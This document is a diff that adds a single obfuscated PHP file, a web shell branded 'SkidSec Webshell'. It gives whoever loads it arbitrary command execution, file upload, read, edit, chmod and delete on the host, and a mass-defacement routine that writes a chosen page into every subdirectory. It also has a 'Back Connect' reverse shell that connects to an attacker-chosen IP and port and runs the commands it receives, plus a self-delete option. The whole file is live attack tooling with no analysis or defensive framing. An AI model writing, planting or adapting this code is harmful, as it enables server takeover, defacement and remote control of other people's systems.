@@ -1,0 +1,211 @@
+<?php ${"GLOBALS"}["whpoodpnku"]="info";${"GLOBALS"}["pefodftxf"]="perms";${"GLOBALS"}["rtnitgjyctm"]="command";${"GLOBALS"}["oxabkwes"]="dateAndTime";${"GLOBALS"}["kpiykybh"]="sysinfo";${"GLOBALS"}["houppixh"]="whoami";${"GLOBALS"}["lozjvriay"]="ip";${"GLOBALS"}["stkxiccff"]="sockfd";${"GLOBALS"}["mcuxfrrrltn"]="port";${"GLOBALS"}["srdhglknx"]="cmd";${"GLOBALS"}["wworwcjrje"]="index";${"GLOBALS"}["dozfysopwhp"]="files";${"GLOBALS"}["ssyadtkf"]="size";${"GLOBALS"}["kgwugxtv"]="file";${"GLOBALS"}["gaphvpmp"]="dir";${"GLOBALS"}["ccvggvk"]="fp";${"GLOBALS"}["vppehbvkkbd"]="i";${"GLOBALS"}["rbzguixqhtn"]="a";${"GLOBALS"}["eqnzdkvfyf"]="pat";${"GLOBALS"}["ircqjjrpjghk"]="id";${"GLOBALS"}["obrpioizy"]="paths";${"GLOBALS"}["tglcgonmgq"]="path";echo "<!DOCTYPE html>
+<html lang=\"en\">
+<head>
+    <link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono\" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Helvetica" rel=\"stylesheet">
+
+    <title>SkidSec Webshell</title>
+</head>
+    <style>
+        body{
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-position: center;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.5)), url(https://l.top4top.io/p_2336hpwhw0.png);
+            color:#fff;
+            margin:0;
+            font: normal 12px/14px Share Tech Mono, Helvetica, sans-serif; 
+            height: 0; 
+            background-color:#000;
+            background-size: 200px;
+    }
+    .head p{
+        margin-left: 20px;
+    }
+    .head h1 {
+        text-align: right;
+        margin-right: 20px;
+        position: relative;
+        top: 50px;
+    }
+
+    #content tr:hover{
+      background-color: #636263;
+    }
+
+    .menu {
+        text-align: center;
+        font-size:80%;
+        padding:15px 10px 1px 10px;
+        border-top: 1px solid rgb(255, 0, 0);
+    }
+    .menu ul form li a{
+        text-align: center;
+        color: white;
+        padding:8px;
+        transition: .6s;
+        text-decoration:none;
+    }
+    .menu ul form li a:hover{
+      color:black;
+      background:rgba(230, 48, 48, 0.76);
+    }
+    ul {
+      list-style-type: none;
+      margin: 0;
+      padding: 0;
+    }
+    li {
+      display: inline-block;
+      margin:0;
+      padding:0;
+
+    }
+
+    .up input[type=submit], input[type=file] {
+        border: 2px solid red;
+        color: #fff;
+        background-color: rgb(0, 0, 0);
+        text-align: center;
+        display: inline-block;
+        cursor: pointer;
+    }
+    a {
+        padding:5px;
+		color: white;
+		text-decoration: none;
+    }
+    a:hover{
+		color: red;
+	}
+
+    </style>
+<body>  
+        <div class="head\">
+            <h1>SkidSec <font color=\"red\">WebShell</font></h1>
+            <p>Server Address : ";echo$_SERVER["SERVER_ADDR"];echo "</p>
+            <p>Web Server : ";echo$_SERVER["SERVER_SOFTWARE"];echo "</p>
+            <p>Uname : ";echo php_uname();echo "</p>
+            <p>PHP Version : ";echo phpversion();echo "</p>
+        </div>
+        <br>
+        <div class="menu\">
+            <ul>
+                <form method=\"POST">
+                    <li><a href=\"?home\">[Home]</a></li>
+                    <li><a href="?cmd\" name="cmd">[Command]</a></li>
+                    <li><a href=\"?md\" name=\"md\">[Mass Deface]</a></li>
+                    <li><a href="https://zone-xsec.com/notify" target=\"_blank">[Zone-Xsec]</a></li>
+                    <li><a href="?bc" name="bc">[Back Connect]</a></li>
+                    <li><a href="?scd" name="scd">[Suicide]</a></li>
+                </form>
+            </ul>
+        </div>
+        <br>
+        <h4><font color="red">Current Path</font> :
+        ";if(isset($_GET["path"])){${${"GLOBALS"}["tglcgonmgq"]}=$_GET["path"];}else{$nsifdpbt="path";${$nsifdpbt}=getcwd();}${${"GLOBALS"}["tglcgonmgq"]}=str_replace("\","/",${${"GLOBALS"}["tglcgonmgq"]});${${"GLOBALS"}["obrpioizy"]}=explode("/",${${"GLOBALS"}["tglcgonmgq"]});foreach(${${"GLOBALS"}["obrpioizy"]} as${${"GLOBALS"}["ircqjjrpjghk"]}=>${${"GLOBALS"}["eqnzdkvfyf"]}){$vtcxguvuouh="pat";if(${$vtcxguvuouh}==""&&${${"GLOBALS"}["ircqjjrpjghk"]}==0){${${"GLOBALS"}["rbzguixqhtn"]}=true;echo"<a href="?path=/\">/</a>";continue;}$tuardxigy="i";if(${${"GLOBALS"}["eqnzdkvfyf"]}=="")continue;$juoystxewyd="id";echo"<a href="?path=";for(${${"GLOBALS"}["vppehbvkkbd"]}=0;${$tuardxigy}<=${$juoystxewyd};${${"GLOBALS"}["vppehbvkkbd"]}++){$zkoyyxugznc="i";${"GLOBALS"}["hryhuqeg"]="id";echo"$paths[$i]";if(${$zkoyyxugznc}!=${${"GLOBALS"}["hryhuqeg"]})echo"/";}echo"">".${${"GLOBALS"}["eqnzdkvfyf"]}."</a>/";}echo"</td></tr><tr><td>";if(isset($_FILES["file"])){if(copy($_FILES["file"]["tmp_name"],${${"GLOBALS"}["tglcgonmgq"]}."/".$_FILES["file"]["name"])){echo"<center><br><font color="red">File Upload Done.</font></center>";}else{echo"<center><br><font color=\"white">File Upload Error.</font></center>";}}echo"<div class=\"up"><br>
+<center><form action="\" method="post" enctype=\"multipart/form-data">
+    <input type=\"file" name=\"file\">
+    <input type="submit\" value=\"Upload\" name="submit">
+  </form>
+  </form>
+</center>
+  </div><br><br>";if(isset($_GET["filesrc"])){echo"<tr><td>Current File : ";echo$_GET["filesrc"];echo"</tr></td></table><br />";echo("<pre>".htmlspecialchars(file_get_contents($_GET["filesrc"]))."</pre>");}elseif(isset($_GET["option"])&&$_POST["opt"]!="delete"){echo"</table><br /><center>".$_POST["path"]."<br /><br />";if($_POST["opt"]=="chmod"){if(isset($_POST["perm"])){if(chmod($_POST["path"],$_POST["perm"])){echo"<font color=\"white">Change Permission Done.</font><br />";}else{echo"<font color="red">Change Permission Error.</font><br />";}}echo"<form method="POST\">
+Permission : <input name="perm\" type=\"text\" size="4\" value=\"".substr(sprintf("%o",fileperms($_POST["path"])),-4)."" style=\"color: white; background-color: black; border: 2px solid red; />
+<input type=\"hidden\" name=\"path" value=\"".$_POST["path"]."">
+<input type=\"hidden\" name=\"opt\" value=\"chmod">
+<input type=\"submit\" value="Save\" style="color: white; background-color: black; border: 1px solid red;\" />
+</form>";}elseif($_POST["opt"]=="rename"){if(isset($_POST["newname"])){$mquxmnzd="path";if(rename($_POST["path"],${$mquxmnzd}."/".$_POST["newname"])){echo"<font color="white">Change Name Done.</font><br />";}else{echo"<font color=\"red">Change Name Error.</font><br />";}$_POST["name"]=$_POST["newname"];}echo"<form method="POST">
+New Name : <input name="newname\" type="text" size="20" value=\"".$_POST["name"]."\" style="color: white; background-color: black; border: 2px solid red; />
+<input type=\"hidden" name="path" value="".$_POST["path"]."">
+<input type="hidden" name="opt\" value=\"rename\">
+<input type="submit\" value="Save" style=\"color: white; background-color: black; border: 1px solid red;\" />
+</form>";}elseif($_POST["opt"]=="edit"){if(isset($_POST["src"])){$bkcvrxzmjg="fp";$ammbdlrbyae="fp";${$ammbdlrbyae}=fopen($_POST["path"],"w");if(fwrite(${${"GLOBALS"}["ccvggvk"]},$_POST["src"])){echo"<font color=\"white\">Edit File Done.</font><br />";}else{echo"<font color="red\">Edit File Error.</font><br />";}fclose(${$bkcvrxzmjg});}echo"<form method="POST">
+<textarea cols=80 rows=20 name=\"src" style=\"color: white; background-color: black; border: 2px solid red;\">".htmlspecialchars(file_get_contents($_POST["path"]))."</textarea><br />
+<br>
+<input type=\"hidden\" name="path" value="".$_POST["path"]."\">
+<input type=\"hidden\" name=\"opt\" value=\"edit">
+<input type=\"submit" value=\"Save" style=\"color: white; background-color: black; border: 1px solid red;\" />
+</form>";}echo"</center>";}else{${"GLOBALS"}["eeikuwvvuqv"]="scandir";$mijwjuxizryu="scandir";echo"</table><br /><center>";if(isset($_GET["option"])&&$_POST["opt"]=="delete"){if($_POST["type"]=="dir"){if(rmdir($_POST["path"])){echo"<font color=\"white">Delete Dir Done.</font><br />";}else{echo"<font color=\"red">Delete Dir Error.</font><br />";}}elseif($_POST["type"]=="file"){if(unlink($_POST["path"])){echo"<font color=\"white\">Delete File Done.</font><br />";}else{echo"<font color=\"red\">Delete File Error.</font><br />";}}}echo"</center>";${${"GLOBALS"}["eeikuwvvuqv"]}=scandir(${${"GLOBALS"}["tglcgonmgq"]});${"GLOBALS"}["hjwblb"]="scandir";echo"<div id="content"><table width=\"100%\" border=\"2" cellpadding="3\" cellspacing=\"1" align=\"center">
+<tr class="first\">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>";foreach(${$mijwjuxizryu} as${${"GLOBALS"}["gaphvpmp"]}){if(!is_dir("$path/$dir")||${${"GLOBALS"}["gaphvpmp"]}=="."||${${"GLOBALS"}["gaphvpmp"]}=="..")continue;echo"<tr>
+<td><a href=\"?path=$path/$dir\">$dir</a></td>
+<td><center>--</center></td>
+<td><center>";if(is_writable("$path/$dir"))echo"<font color=\"white">";elseif(!is_readable("$path/$dir"))echo"<font color=\"red\">";echo perms("$path/$dir");if(is_writable("$path/$dir")||!is_readable("$path/$dir"))echo"</font>";echo"</center></td>
+<td><center><form method="POST" action=\"?option&path=$path">
+<select name="opt\" style="color: #fff; background-color: black; border: 1px solid white;\">
+<option value=""></option>
+<option value=\"delete">Delete</option>
+<option value=\"chmod">Chmod</option>
+<option value=\"rename">Rename</option>
+</select>
+<input type=\"hidden\" name="type\" value="dir\">
+<input type="hidden" name="name\" value="$dir">
+<input type=\"hidden" name=\"path\" value=\"$path/$dir\">
+<input type="submit\" value=">" style=\"color: white; background-color: black; border: 1px solid white;\" />
+</form></center></td>
+</tr>";}echo"<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";foreach(${${"GLOBALS"}["hjwblb"]} as${${"GLOBALS"}["kgwugxtv"]}){if(!is_file("$path/$file"))continue;${"GLOBALS"}["lsgrzemtvcg"]="size";$sbbjssggk="size";${${"GLOBALS"}["lsgrzemtvcg"]}=filesize("$path/$file")/1024;${$sbbjssggk}=round(${${"GLOBALS"}["ssyadtkf"]},3);if(${${"GLOBALS"}["ssyadtkf"]}>=1024){${"GLOBALS"}["esupsd"]="size";${${"GLOBALS"}["ssyadtkf"]}=round(${${"GLOBALS"}["esupsd"]}/1024,2)." MB";}else{${${"GLOBALS"}["ssyadtkf"]}=${${"GLOBALS"}["ssyadtkf"]}." KB";}echo"<tr>
+<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td><center>".${${"GLOBALS"}["ssyadtkf"]}."</center></td>
+<td><center>";if(is_writable("$path/$file"))echo"<font color=\"red\">";elseif(!is_readable("$path/$file"))echo"<font color="white">";echo perms("$path/$file");if(is_writable("$path/$file")||!is_readable("$path/$file"))echo"</font>";echo"</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt" style=\"color: #fff; background-color: black; border: 1px solid white;">
+<option value=\""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value=\"edit">Edit</option>
+</select>
+<input type=\"hidden\" name="type\" value="file">
+<input type=\"hidden" name="name\" value="$file">
+<input type=\"hidden\" name="path\" value="$path/$file">
+<input type=\"submit" value=\">\" style="color: white; background-color: black; border: 1px solid white;" />
+</form></center></td>
+</tr>";}echo"</table>
+</div>";}if(isset($_GET["md"])){echo"<center><form method='POST'>
+<h1><font color='red'>Mass Deface</font></h1>
+<font color='white'>Target Folder</font><br>
+<input cols='10' rows='10' type='text' style='color:red;background-color:#000000;' name='base_dir' value='".getcwd()."'><br><br>
+<font color='white'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:red;background-color:#000000' name='nm' value='pawned.txt'><br><br>
+<font color='white'>Script Deface</font><br><textarea cols='50' rows='10' style='color:red;background-color:#000000;' name='index'></textarea><br>
+<br><input type='submit' value='>>>' style='color: white; background-color: #000000; border: 2px solid red;'></form></center>";if(isset($_POST["base_dir"])){if(!file_exists($_POST["base_dir"]))die($_POST["base_dir"]." Not Found <br>");if(!is_dir($_POST["base_dir"]))die($_POST["base_dir"]." Is Not A Directory <br>");${"GLOBALS"}["asmrwvyetfdc"]="files";@chdir($_POST["base_dir"])or die("Cannot Open Directory");${${"GLOBALS"}["asmrwvyetfdc"]}=@scandir($_POST["base_dir"])or die("Hmm? <br>");foreach(${${"GLOBALS"}["dozfysopwhp"]} as${${"GLOBALS"}["kgwugxtv"]}){${"GLOBALS"}["dumicrtgm"]="file";$hsnsypg="file";if(${${"GLOBALS"}["kgwugxtv"]}!="."&&${${"GLOBALS"}["dumicrtgm"]}!=".."&&@filetype(${$hsnsypg})=="dir"){${"GLOBALS"}["sdzfsfrke"]="index";${"GLOBALS"}["mtmjawkuzv"]="file";${${"GLOBALS"}["wworwcjrje"]}=getcwd()."/".${${"GLOBALS"}["mtmjawkuzv"]}."/".$_POST["nm"];if(file_put_contents(${${"GLOBALS"}["sdzfsfrke"]},$_POST["index"]))echo"<br>>> <font color='red'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='white'>-> OK</font><br>";}}}}if(isset($_REQUEST["cmd"])){echo"<br><center><form action="\" method=\"get\">
+        <h1><font color="red">Command</font></h1>
+        Command: <input type=\"text" name="cmd\" style="color: white; background-color: black; border: 2px solid red;\" />
+        <input type=\"submit" value=\"Execute" style=\"color: white; background-color: black; border: 2px solid red;" />
+        </form><br>";echo"<pre>";${${"GLOBALS"}["srdhglknx"]}=($_REQUEST["cmd"]);system(${${"GLOBALS"}["srdhglknx"]});echo"</pre></center>";die;}if(isset($_GET["port"])&&isset($_GET["ip"])&&$_GET["port"]!=""&&$_GET["ip"]!=""){$vgllicnkpw="sockfd";$tdwgypyz="ip";$jdhopmj="errno";${"GLOBALS"}["hsstismixqk"]="errno";$qvgjxkde="port";$sewltitqi="errstr";${$tdwgypyz}=$_GET["ip"];${${"GLOBALS"}["mcuxfrrrltn"]}=$_GET["port"];${${"GLOBALS"}["stkxiccff"]}=fsockopen(${${"GLOBALS"}["lozjvriay"]},${$qvgjxkde},${${"GLOBALS"}["hsstismixqk"]},${$sewltitqi});if(${$jdhopmj}!=0){echo"<font color='red'><b>$errno</b> : $errstr</font>";}else if(!${$vgllicnkpw}){${"GLOBALS"}["dvmjsxakeni"]="result";${${"GLOBALS"}["dvmjsxakeni"]}="<p>Fatal : An unexpected error was occured when trying to connect!</p>";}else{$ytycwjqdk="pwhoami";$owjobkwi="id";$jjacptcv="sysinfo";$leckxxgxv="sockfd";fputs(${$leckxxgxv},"Welcome Skiddie");$mkmftxxs="sockfd";${${"GLOBALS"}["houppixh"]}=shell_exec("whoami");$ehoqflkpiy="len";${${"GLOBALS"}["kpiykybh"]}=shell_exec("uname -a");${$owjobkwi}=shell_exec("id");${"GLOBALS"}["kjpmezupnp"]="sockfd";${${"GLOBALS"}["oxabkwes"]}=shell_exec("time /t & date /T");${$ehoqflkpiy}=1337;fputs(${${"GLOBALS"}["stkxiccff"]},${$jjacptcv}."
+");${"GLOBALS"}["clyhhjfz"]="dateAndTime";fputs(${$mkmftxxs},${$ytycwjqdk}."
+");fputs(${${"GLOBALS"}["stkxiccff"]},${${"GLOBALS"}["ircqjjrpjghk"]}."
+");fputs(${${"GLOBALS"}["stkxiccff"]},${${"GLOBALS"}["clyhhjfz"]}."
+");while(!feof(${${"GLOBALS"}["kjpmezupnp"]})){${"GLOBALS"}["rmjkmxyjxmy"]="cmdPrompt";${"GLOBALS"}["kysncvyihqt"]="len";$uifeithm="cmdPrompt";$ntpkvjo="sockfd";${${"GLOBALS"}["rmjkmxyjxmy"]}=">>> ";fputs(${${"GLOBALS"}["stkxiccff"]},${$uifeithm});${${"GLOBALS"}["rtnitgjyctm"]}=fgets(${${"GLOBALS"}["stkxiccff"]},${${"GLOBALS"}["kysncvyihqt"]});fputs(${$ntpkvjo},shell_exec(${${"GLOBALS"}["rtnitgjyctm"]}));}fclose(${${"GLOBALS"}["stkxiccff"]});}}if(isset($_GET["bc"])){echo"<table align="center" >
+    <form method="GET\">
+    <center><h1><font color="red\">Back Connect</font></h1></center>
+    <td>
+       <table style=\"border-spacing: 6px;\">
+           <tr>
+               <td>Port</td>
+               <td>
+                   <input style=\"width: 100px; color: white; background-color: black; border: 2px solid red;\" name="port\" value=\"31337" />
+               </td>
+           </tr>
+           <tr>
+               <td>IP </td>
+               <td><input style=\"width: 150px; color: white; background-color: black; border: 2px solid red;" name="ip\" size="5" value="127.0.0.1\"/>
+           </tr>
+           <tr>
+           <td>
+           <input style=\"color: white; background-color: black; border: 2px solid red;\" class="own\" type=\"submit" value=\"Connect"/>
+           </td>
+           </tr>    
+              
+       </table>
+    </td>
+    </form>
+</tr>
+</table>";}if(isset($_GET["scd"])){unlink(__FILE__);echo"<center><h1><font color="red">Good Bye!!!</font></h1></center>";}function perms($file){$eapwwldih="perms";${"GLOBALS"}["kqphdrv"]="perms";$iwcdhyll="perms";${"GLOBALS"}["rpdhaefufc"]="perms";${"GLOBALS"}["tpiawgwt"]="perms";${"GLOBALS"}["skkqjfbqkrbq"]="perms";${${"GLOBALS"}["pefodftxf"]}=fileperms(${${"GLOBALS"}["kgwugxtv"]});${"GLOBALS"}["fqwlpyf"]="perms";${"GLOBALS"}["slvbwvcu"]="perms";${"GLOBALS"}["ylrynd"]="info";if((${${"GLOBALS"}["rpdhaefufc"]}&0xC000)==0xC000){$pmotcswio="info";${$pmotcswio}="s";}elseif((${${"GLOBALS"}["pefodftxf"]}&0xA000)==0xA000){${${"GLOBALS"}["whpoodpnku"]}="l";}elseif((${${"GLOBALS"}["pefodftxf"]}&0x8000)==0x8000){${${"GLOBALS"}["whpoodpnku"]}="-";}elseif((${${"GLOBALS"}["slvbwvcu"]}&0x6000)==0x6000){$zeprndpt="info";${$zeprndpt}="b";}elseif((${${"GLOBALS"}["pefodftxf"]}&0x4000)==0x4000){${${"GLOBALS"}["whpoodpnku"]}="d";}elseif((${${"GLOBALS"}["skkqjfbqkrbq"]}&0x2000)==0x2000){${"GLOBALS"}["tsqijffvuh"]="info";${${"GLOBALS"}["tsqijffvuh"]}="c";}elseif((${${"GLOBALS"}["pefodftxf"]}&0x1000)==0x1000){${${"GLOBALS"}["whpoodpnku"]}="p";}else{${${"GLOBALS"}["whpoodpnku"]}="u";}$rjnqztkvm="perms";${${"GLOBALS"}["whpoodpnku"]}.=((${${"GLOBALS"}["pefodftxf"]}&0x0100)?"r":"-");${${"GLOBALS"}["whpoodpnku"]}.=((${$eapwwldih}&0x0080)?"w":"-");${${"GLOBALS"}["whpoodpnku"]}.=((${${"GLOBALS"}["pefodftxf"]}&0x0040)?((${${"GLOBALS"}["fqwlpyf"]}&0x0800)?"s":"x"):((${${"GLOBALS"}["pefodftxf"]}&0x0800)?"S":"-"));$snhhacmh="info";${${"GLOBALS"}["whpoodpnku"]}.=((${${"GLOBALS"}["pefodftxf"]}&0x0020)?"r":"-");${$snhhacmh}.=((${$rjnqztkvm}&0x0010)?"w":"-");${${"GLOBALS"}["whpoodpnku"]}.=((${${"GLOBALS"}["pefodftxf"]}&0x0008)?((${${"GLOBALS"}["pefodftxf"]}&0x0400)?"s":"x"):((${${"GLOBALS"}["pefodftxf"]}&0x0400)?"S":"-"));$zakorrbskj="perms";$qujobge="info";${${"GLOBALS"}["ylrynd"]}.=((${${"GLOBALS"}["pefodftxf"]}&0x0004)?"r":"-");${${"GLOBALS"}["whpoodpnku"]}.=((${${"GLOBALS"}["tpiawgwt"]}&0x0002)?"w":"-");${${"GLOBALS"}["whpoodpnku"]}.=((${$zakorrbskj}&0x0001)?((${$iwcdhyll}&0x0200)?"t":"x"):((${${"GLOBALS"}["kqphdrv"]}&0x0200)?"T":"-"));return${$qujobge};}echo "</body>
+</html>
+"; 
+?>
